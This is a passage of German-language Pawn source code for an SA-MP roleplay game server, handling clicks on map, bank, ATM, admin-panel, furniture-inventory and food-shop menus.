		ShowPlayerDialog(playerid, DIALOG_CIMAP, DIALOG_STYLE_LIST, "County Islands | Portland","• Makierung setzen\n• Stadtplan anzeigen\n• Entfernung berechnen", "Weiter", "Zurück");
	}
	if(clickedid == county_map[28])//Lake Sorten
	{
		ci_map_selected[playerid]=3;
		ShowPlayerDialog(playerid, DIALOG_CIMAP, DIALOG_STYLE_LIST, "County Islands | Lake Sorten","• Makierung setzen\n• Stadtplan anzeigen\n• Entfernung berechnen", "Weiter", "Zurück");
	}
	if(clickedid == county_map[29])//Wrong Hill
	{
		ci_map_selected[playerid]=4;
		ShowPlayerDialog(playerid, DIALOG_CIMAP, DIALOG_STYLE_LIST, "County Islands | Wrong Hill","• Makierung setzen\n• Stadtplan anzeigen\n• Entfernung berechnen", "Weiter", "Zurück");
	}
	if(clickedid == county_map[30])//Santa Felton
	{
		ci_map_selected[playerid]=5;
		ShowPlayerDialog(playerid, DIALOG_CIMAP, DIALOG_STYLE_LIST, "County Islands | Santa Felton","• Makierung setzen\n• Stadtplan anzeigen\n• Entfernung berechnen", "Weiter", "Zurück");
	}
	if(clickedid == county_map[31])//Lake Vortex
	{
		ci_map_selected[playerid]=6;
		ShowPlayerDialog(playerid, DIALOG_CIMAP, DIALOG_STYLE_LIST, "County Islands | Lake Vortex","• Makierung setzen\n• Stadtplan anzeigen\n• Entfernung berechnen", "Weiter", "Zurück");
	}
	if(clickedid == UserBr[6])
 	{
 	    ShowPlayerDialog(playerid,DIALOG_TIMEL,DIALOG_STYLE_LIST,"Inventar","Inventar\nMöbel\nHandy\nFahrzeuge\nFraktion\nNavigation\nStatistik\nHilfe\nSupport","Weiter","Abbrechen");
 	}
	if(clickedid == Bankmenu[4] || clickedid == Bankmenu[5] || clickedid == Bankmenu[6] || clickedid == Bankmenu[8] || clickedid == Bankmenu[10] || clickedid == Bankmenu[11])
	{
	    for(new x = 0; x < sizeof(Bankmenu); x++)
		{
		    TextDrawHideForPlayer(playerid,Bankmenu[x]);
		}
		PlayerTextDrawHide(playerid,Bankmenu_Stand[playerid]);
		CancelSelectTextDraw(playerid);
	}
	if(clickedid == Bankmenu[4]) //Einzahlen
	{
	    ShowPlayerDialog(playerid,DIALOG_BANK_EINZAHLEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wie viel möchtest du einzahlen?","Einzahlen","Abbrechen");
	}
	else if(clickedid == Bankmenu[5]) //Auszahlen
	{
        ShowPlayerDialog(playerid,DIALOG_BANK_AUSZAHLEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wie viel möchtest du abheben?","Abheben","Abbrechen");
	}
	else if(clickedid == Bankmenu[6]) //Überweisen
	{
	    if(SpielerInfo[playerid][uLevel] >= 5)
	    {
        	ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wem möchtest du Geld überweisen?","Weiter","Abbrechen");
		}
		else
		{
		    SendClientMessage(playerid,COLOR_RED,"Hierfür wird mindestens Level 5 benötigt!");
		}
	}
	else if(clickedid == Bankmenu[8]) //Kontoauszug
	{
	    format(string,sizeof string,"SELECT * FROM kontolog WHERE `ID`='%d'",SpielerInfo[playerid][uID]);
		mysql_query(dbhandle, string, true);
		printf("%s",string);
		new betrag[20],Verwendung[60],zeit,query[2048],year, month, day, hour, minute, second;
		for(new i=0; i<cache_num_rows(); i++)
		{
		    cache_get_field_content(i, "Zweck",Verwendung);
		    cache_get_field_content(i, "Betrag",betrag);
		    zeit = cache_get_field_content_int(i, "Zeit");
		    TimestampToDate(zeit, year, month, day, hour, minute, second);
		    if(strfind(betrag,"-")) format(betrag,sizeof betrag,"{00FF00}%s",betrag);
		    else format(betrag,sizeof betrag,"{FF0000}%s",betrag);
		    if(strlen(Verwendung) < 18)
		    {
				if(strlen(betrag) > 14) format(query,sizeof query,"%s%s\t\t\t\t\t\t%s${FFFFFF}\t%02d.%02d.%d %02d:%02d\n",query,Verwendung,betrag,day,month,year,hour,minute);
	    		else format(query,sizeof query,"%s%s\t\t\t\t\t\t%s${FFFFFF}\t\t%02d.%02d.%d %02d:%02d\n",query,Verwendung,betrag,day,month,year,hour,minute);
			}
			else
			{
				format(Verwendung,sizeof Verwendung,"%s                                                       ",Verwendung);
				format(query,sizeof query,"%s%s\t%s${FFFFFF}\t\t%02d.%02d.%d %02d:%02d\n",query,Verwendung,betrag,day,month,year,hour,minute);
			}
		}
		if(strlen(query) != 0)
		{
	        ShowPlayerDialog(playerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"{00D80A}Bank",query,"Fertig","");
	        format(string,sizeof string,"DELETE FROM kontolog WHERE `ID`='%d'",SpielerInfo[playerid][uID]);
			mysql_query(dbhandle, string);
			printf("%s",query);
		}
		else SendClientMessage(playerid,COLOR_RED,"Keine Kontoveränderung seit dem letzten Kontoauszug!");
	}
	else if(clickedid == Bankmenu[9]) //Kredit
	{
	    if(SpielerInfo[playerid][uLevel] >= 10)
	    {
			ShowPlayerDialog(playerid,BANK_KREDIT,DIALOG_STYLE_INPUT,"Kredit","Gebe deinen gewünschten Betrag ein:","Weiter","Abbrechen");
		}
		else
		{
			SendClientMessage(playerid,COLOR_RED,"Kredite sind erst ab Level 10!");
		}
	}
	else if(clickedid == Bankmenu[10]) //Infos über Bank
	{
		ShowPlayerDialog(playerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"Bankinformationen","Sie befinden sich in der County Islands Bank Hauptzentralle.\nDie Bank ist in Besitz des Staates und ist nicht erwerbbar!\nAuf keiner der verfügbaren Bankaktionen fallen Bearbeitungskosten an!\n\n\nDer Staat County Islands","Okay","");
	}
	if(clickedid == ATMmenu[4] || clickedid == ATMmenu[5] || clickedid == ATMmenu[6] || clickedid == ATMmenu[8] || clickedid == ATMmenu[9])
	{
		for(new x = 0; x < sizeof(ATMmenu); x++)
		{
		    TextDrawHideForPlayer(playerid,ATMmenu[x]);
		}
		PlayerTextDrawHide(playerid,ATMmenu_Stand[playerid]);
		CancelSelectTextDraw(playerid);
	}
	if(clickedid == ATMmenu[4]) //Auszahlen
	{
        ShowPlayerDialog(playerid,DIALOG_BANK_AUSZAHLEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wie viel möchtest du abheben?","Abheben","Abbrechen");
	}
	else if(clickedid == ATMmenu[6]) //Überweisen
	{
	    if(SpielerInfo[playerid][uLevel] >= 5)
	    {
        	ShowPlayerDialog(playerid,DIALOG_BANK_UEBERWEISEN,DIALOG_STYLE_INPUT,"{00D80A}Bank","Wem möchtest du Geld überweisen?","Weiter","Abbrechen");
		}
		else
		{
		    SendClientMessage(playerid,COLOR_RED,"Hierfür wird mindestens Level 5 benötigt!");
		}
	}
	else if(clickedid == ATMmenu[5]) //Kontoauszug
	{
	    format(string,sizeof string,"SELECT * FROM kontolog WHERE `ID`='%d'",SpielerInfo[playerid][uID]);
		mysql_query(dbhandle, string, true);
		printf("%s",string);
		new betrag[20],Verwendung[60],zeit,query[2048],year, month, day, hour, minute, second;
		for(new i=0; i<cache_num_rows(); i++)
		{
		    cache_get_field_content(i, "Zweck",Verwendung);
		    cache_get_field_content(i, "Betrag",betrag);
		    zeit = cache_get_field_content_int(i, "Zeit");
		    TimestampToDate(zeit, year, month, day, hour, minute, second);
		    if(strfind(betrag,"-")) format(betrag,sizeof betrag,"{00FF00}%s",betrag);
		    else format(betrag,sizeof betrag,"{FF0000}%s",betrag);
		    if(strlen(Verwendung) < 18)
		    {
				if(strlen(betrag) > 14) format(query,sizeof query,"%s%s\t\t\t\t\t\t%s${FFFFFF}\t%02d.%02d.%d %02d:%02d\n",query,Verwendung,betrag,day,month,year,hour,minute);
	    		else format(query,sizeof query,"%s%s\t\t\t\t\t\t%s${FFFFFF}\t\t%02d.%02d.%d %02d:%02d\n",query,Verwendung,betrag,day,month,year,hour,minute);
			}
			else
			{
				format(Verwendung,sizeof Verwendung,"%s                                                       ",Verwendung);
				format(query,sizeof query,"%s%s\t%s${FFFFFF}\t\t%02d.%02d.%d %02d:%02d\n",query,Verwendung,betrag,day,month,year,hour,minute);
			}
		}
		if(strlen(query) != 0)
		{
	        ShowPlayerDialog(playerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"{00D80A}Bank",query,"Fertig","");
	        format(string,sizeof string,"DELETE FROM kontolog WHERE `ID`='%d'",SpielerInfo[playerid][uID]);
			mysql_query(dbhandle, string);
			printf("%s",query);
		}
		else SendClientMessage(playerid,COLOR_RED,"Keine Kontoveränderung seit dem letzten Kontoauszug!");
	}
	else if(clickedid == ATMmenu[8]) //Infos über Bank
	{
		ShowPlayerDialog(playerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"Bankinformationen","Dies ist ein Bankautomat von County Islands und kann nicht erworben werden!\nBei unseren Automaten fallen keine Bebühren an\n\nIhr Staat County Islands","Okay","");
	}
	else if(clickedid == AdminPanel[4])
	{
	    format(string,sizeof string,"Warum willst du %s kicken?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid, ADMIN_KICK, DIALOG_STYLE_INPUT, "Kick", string, "Kicken","Abbrechen");
	}
	else if(clickedid == AdminPanel[5])
	{
	    if(SpielerInfo[playerid][uAdmin] > 1)
	    {
		    format(string,sizeof string,"Warum willst du %s bannen?",PlayerName(ClickedID[playerid]));
		    ShowPlayerDialog(playerid, ADMIN_BANN, DIALOG_STYLE_INPUT, "Bann", string, "Bannen","Abbrechen");
		}else KeineRechte(playerid);
	}
	else if(clickedid == AdminPanel[6])
	{
	    format(string,sizeof string,"Warum willst du %s verwarnen?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid, ADMIN_WARN, DIALOG_STYLE_INPUT, "Verwarnen", string, "Verwarnen","Abbrechen");
	}
	else if(clickedid == AdminPanel[7])
	{
	    format(string,sizeof string,"Wie viel Leben willst du %s geben?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid, ADMIN_LEBEN, DIALOG_STYLE_INPUT, "Leben", string, "OK","Abbrechen");
	}
	else if(clickedid == AdminPanel[8])
	{
	    format(string,sizeof string,"Wie viel Rüstung willst du %s geben?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid, ADMIN_RUESTUNG, DIALOG_STYLE_INPUT, "Rüstung", string, "OK","Abbrechen");
	}
	else if(clickedid == AdminPanel[9])
	{
		new Float:X,Float:Y,Float:Z;
		GetPlayerPos(ClickedID[playerid],X,Y,Z);
		Teleport(ClickedID[playerid],X,Y,Z+5);
		format(string,sizeof string,"Admin %s hat dich geslapt.",PlayerName(playerid));
		SendClientMessage(ClickedID[playerid],COLOR_LIGHTRED,string);
		format(string,sizeof string,"Du hast %s geslapt.",PlayerName(ClickedID[playerid]));
		SendClientMessage(playerid,COLOR_GREEN,string);
		AdminPanelAbbrechen(playerid);
	}
	else if(clickedid == AdminPanel[10])
	{
	    if(Spectate[playerid] == -1)
	    {
	        GetPlayerPos(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]);
			TogglePlayerSpectating(playerid, 1);
	    	PlayerSpectatePlayer(playerid, ClickedID[playerid]);
	    	Spectate[playerid] = ClickedID[playerid];
    	}
    	else
    	{
    	    TogglePlayerSpectating(playerid, 0);
    	}
    	AdminPanelAbbrechen(playerid);
	}
	else if(clickedid == AdminPanel[11])
	{
	    format(string,sizeof string,"In welchen Interior willst du %s setzen`?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid, ADMIN_INT, DIALOG_STYLE_INPUT, "Interior", string, "OK","Abbrechen");
	}
	else if(clickedid == AdminPanel[12])
	{
	    format(string,sizeof string,"In welche Welt willst du %s setzen?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid, ADMIN_WELT, DIALOG_STYLE_INPUT, "Welt", string, "OK","Abbrechen");
	}
	else if(clickedid == AdminPanel[13])
	{
	    Reparieren(GetPlayerVehicleID(ClickedID[playerid]));
	    AdminPanelAbbrechen(playerid);
	}
	else if(clickedid == AdminPanel[14])
	{
	    format(string,sizeof string,"Was willst du %s schreiben?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid, ADMIN_SAY, DIALOG_STYLE_INPUT, "Anschreiben", string, "Senden","Abbrechen");
	}
	else if(clickedid == AdminPanel[16])
	{
	    /*format(string,sizeof string,"Wie viele Stunden willst du %s bannen?",PlayerName(ClickedID[playerid]));
	    ShowPlayerDialog(playerid,ADMIN_TIMEBANN,DIALOG_STYLE_INPUT,"Timebann",string,"Bannen","Abbrechen");*/
	}
    else if(clickedid == AdminPanel[15])
    {
        AdminPanelAbbrechen(playerid);
	}
	else if(clickedid == MoebelInv[8])//Links
	{
		if(InventarValue[playerid] <= 9) InventarValue[playerid] = MAX_INVENTAR;
		else InventarValue[playerid]-=9;
		Streamer_UpdateEx(playerid, MoebelInvView[0][0],MoebelInvView[0][1],MoebelInvView[0][2]);
		for(new x = 9; x != 0; x--)
		{
		    if(IsValidDynamicObject(ObjectShow[playerid][9-x]))
			{
		 		DestroyDynamicObject(ObjectShow[playerid][9-x]);
		 		ObjectShow[playerid][9-x] = INVALID_OBJECT_ID;
 			}
			if(Inventar[playerid][InventarValue[playerid]-x] < 1) continue;
			ObjectShow[playerid][9-x] = CreateDynamicObject(Inventar[playerid][InventarValue[playerid]-x], MoebelInvView[9-x][0],MoebelInvView[9-x][1],MoebelInvView[9-x][2],0,0,180,-1,-1,playerid);
		}
	}
	else if(clickedid == MoebelInv[9])//Rechts
	{
	    if(InventarValue[playerid]+9 < MAX_INVENTAR) InventarValue[playerid] += 9;
		else InventarValue[playerid] = 9;
		Streamer_UpdateEx(playerid, MoebelInvView[0][0],MoebelInvView[0][1],MoebelInvView[0][2]);
		for(new x = 9; x != 0; x--)
		{
		    if(IsValidDynamicObject(ObjectShow[playerid][9-x]))
			{
				DestroyDynamicObject(ObjectShow[playerid][9-x]);
				ObjectShow[playerid][9-x] = INVALID_OBJECT_ID;
			}
			if(Inventar[playerid][InventarValue[playerid]-x] < 1) continue;
			ObjectShow[playerid][9-x] = CreateDynamicObject(Inventar[playerid][InventarValue[playerid]-x], MoebelInvView[9-x][0],MoebelInvView[9-x][1],MoebelInvView[9-x][2],0,0,180,-1,-1,playerid);
		}
	}
	for(new x = 10; x < 19; x++)
	{
	    if(clickedid == MoebelInv[x])
	    {
	        new feld = x-9,Float:X,Float:Y,Float:Z;
	        if(Inventar[playerid][InventarValue[playerid]-10+feld] != -1)
	        {
	            for(new y = 0; y < sizeof(MoebelInv); y++) TextDrawHideForPlayer(playerid,MoebelInv[y]);
		        Teleport(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]+1);
		        SetPlayerVirtualWorld(playerid, 0);
				X = SpielerInfo[playerid][uPosX];
				Y = SpielerInfo[playerid][uPosY];
				Z = SpielerInfo[playerid][uPosZ];
		        Unfreeze(playerid);
		       	EditingObject[playerid] = CreateDynamicObject(Inventar[playerid][InventarValue[playerid]-10+feld],X+1,Y+1,Z-0.5,0.00,0.00,0.00,0,0,playerid);
				Moebel[SpielerInfo[playerid][uHausschluessel]][Moebelanzahl[SpielerInfo[playerid][uHausschluessel]]] = EditingObject[playerid];
	            ObjectSet[playerid] = 1;
				Moebelmodell[SpielerInfo[playerid][uHausschluessel]][Moebelanzahl[SpielerInfo[playerid][uHausschluessel]]] = Inventar[playerid][InventarValue[playerid]-10+feld];
				CancelSelectTextDraw(playerid);
			   	for(new y = 9; y != 0; y--)
				{
				    if(IsValidDynamicObject(ObjectShow[playerid][9-y]))
					{
						DestroyDynamicObject(ObjectShow[playerid][9-y]);
						ObjectShow[playerid][9-y] = INVALID_OBJECT_ID;
					}
				}
		       	SetCameraBehindPlayer(playerid);
		       	EditingObjectModel[playerid] = Inventar[playerid][InventarValue[playerid]-10+feld];
		       	ClickedInvantarID[playerid] = InventarValue[playerid]-10+feld;
		       	SetTimerEx("Editing",1500,0,"d",playerid);
	       	}
	       	else
	       	{
	       	    SendClientMessage(playerid,COLOR_RED,"In diesem Slot hast du kein Möbelstück!");
	       	}
	  		break;
	    }
	}
	if(clickedid == MoebelInv[19])
	{
	    Teleport(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]+1);
	    SetPlayerVirtualWorld(playerid, 0);
	    for(new y = 0; y < sizeof(MoebelInv); y++) TextDrawHideForPlayer(playerid,MoebelInv[y]);
	    Unfreeze(playerid);
	    SetCameraBehindPlayer(playerid);
	    CancelSelectTextDraw(playerid);
	}
	else if(clickedid == EssensMenu[2])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Hamburger für 1.50$ gekauft.");
	    GebeGeld(playerid,-1.50);
		SpielerInfo[playerid][uHunger]+=20;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 1.5; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[3])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Cheesburger für 1.50$ gekauft.");
	    GebeGeld(playerid,-1.50);
		SpielerInfo[playerid][uHunger]+=20;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 1.5; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[4])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Chickenburger für 1.50$ gekauft.");
	    GebeGeld(playerid,-1.50);
		SpielerInfo[playerid][uHunger]+=20;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 1.5; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[5])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.8) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Chicken Nuggets für 1.80$ gekauft.");
	    GebeGeld(playerid,-1.80);
		SpielerInfo[playerid][uHunger]+=26;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 1.8; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[6])
	{
	    if(SpielerInfo[playerid][uGeld] < 2.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Double Hamburger für 2.50$ gekauft.");
	    GebeGeld(playerid,-2.50);
		SpielerInfo[playerid][uHunger]+=40;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 2.5; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[7])
	{
	    if(SpielerInfo[playerid][uGeld] < 2) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Salat für 2.00$ gekauft.");
	    GebeGeld(playerid,-2);
		SpielerInfo[playerid][uHunger]+=30;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 2.0; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[8])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.7) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Portion Pommes für 1.70$ gekauft.");
	    GebeGeld(playerid,-1.70);
		SpielerInfo[playerid][uHunger]+=24;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 1.7; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[9])
	{
	    if(SpielerInfo[playerid][uGeld] < 2.8) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Riesen Pommes für 2.80$ gekauft.");
	    GebeGeld(playerid,-2.80);
		SpielerInfo[playerid][uHunger]+=44;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 2.8; Geschaftspeichern(2);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[10])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.6) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Softdrink für 1.60$ gekauft.");
	    GebeGeld(playerid,-1.60);
		SpielerInfo[playerid][uHunger]+=10;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 1.6; Geschaftspeichern(2);
		ApplyAnimation(playerid,"VENDING","VEND_Drink2_P",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssensMenu[11])
	{
	    if(SpielerInfo[playerid][uGeld] < 1) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Wasser für 1$ gekauft.");
	    GebeGeld(playerid,-1);
		SpielerInfo[playerid][uHunger]+=10;
		for(new x = 0; x < sizeof(EssensMenu); x++) TextDrawHideForPlayer(playerid, EssensMenu[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[2][bkasse] += 1.0; Geschaftspeichern(2);
		ApplyAnimation(playerid,"VENDING","VEND_Drink2_P",4.2,0,0,0,0,0);
	}
	if(clickedid == EssenPizza[2])
	{
	    if(SpielerInfo[playerid][uGeld] < 2.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Pizza Margharita für 2.50$ gekauft.");
	    GebeGeld(playerid,-2);
		SpielerInfo[playerid][uHunger]+=15;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 2.0; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[3])
	{
	    if(SpielerInfo[playerid][uGeld] < 3.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Pizza Salami für 3.50$ gekauft.");
	    GebeGeld(playerid,-3.50);
		SpielerInfo[playerid][uHunger]+=20;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 3.5; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[4])
	{
	    if(SpielerInfo[playerid][uGeld] < 3.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Pizza Schinken für 3.50$ gekauft.");
	    GebeGeld(playerid,-3.50);
		SpielerInfo[playerid][uHunger]+=20;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 3.5; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[5])
	{
	    if(SpielerInfo[playerid][uGeld] < 4.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Pizza Hawaii für 4.50$ gekauft.");
	    GebeGeld(playerid,-4.50);
		SpielerInfo[playerid][uHunger]+=25;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 4.5; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[6])
	{
	    if(SpielerInfo[playerid][uGeld] < 5.5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Pizza Thunfisch für 5.50$ gekauft.");
	    GebeGeld(playerid,-5.50);
		SpielerInfo[playerid][uHunger]+=30;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 5.5; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[7])
	{
	    if(SpielerInfo[playerid][uGeld] < 2) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Salat für 2.00$ gekauft.");
	    GebeGeld(playerid,-2);
		SpielerInfo[playerid][uHunger]+=12;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 2.0; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[8])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.7) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Portion Pommes für 1.70$ gekauft.");
	    GebeGeld(playerid,-1.70);
		SpielerInfo[playerid][uHunger]+=9;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 1.7; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[9])
	{
		if(SpielerInfo[playerid][uGeld] < 2.8) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Riesen Pommes für 2.80$ gekauft.");
	    GebeGeld(playerid,-2.80);
		SpielerInfo[playerid][uHunger]+=16;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 2.8; Geschaftspeichern(7);
		ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[10])
	{
	    if(SpielerInfo[playerid][uGeld] < 1.60) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Softdrink für 1.60$ gekauft.");
	    GebeGeld(playerid,-1.60);
		SpielerInfo[playerid][uHunger]+=8;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 1.6; Geschaftspeichern(7);
		ApplyAnimation(playerid,"VENDING","VEND_Drink2_P",4.2,0,0,0,0,0);
	}
	else if(clickedid == EssenPizza[11])
	{
	    if(SpielerInfo[playerid][uGeld] < 1) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    SendClientMessage(playerid,COLOR_GREEN,"Wasser für 1$ gekauft.");
	    GebeGeld(playerid,-1);
		SpielerInfo[playerid][uHunger]+=6;
		for(new x = 0; x < sizeof(EssenPizza); x++) TextDrawHideForPlayer(playerid, EssenPizza[x]);
		CancelSelectTextDraw(playerid);
		BizInfo[7][bkasse] += 1; Geschaftspeichern(7);
		ApplyAnimation(playerid,"VENDING","VEND_Drink2_P",4.2,0,0,0,0,0);
	}
	return 1;
}
public OnPlayerEnterCheckpoint(playerid)
{
	if(SpielerInfo[playerid][uStrafCP] == 0)
	{
		DisablePlayerCheckpoint(playerid);
		SpielerInfo[playerid][uStrafCP] = 1;
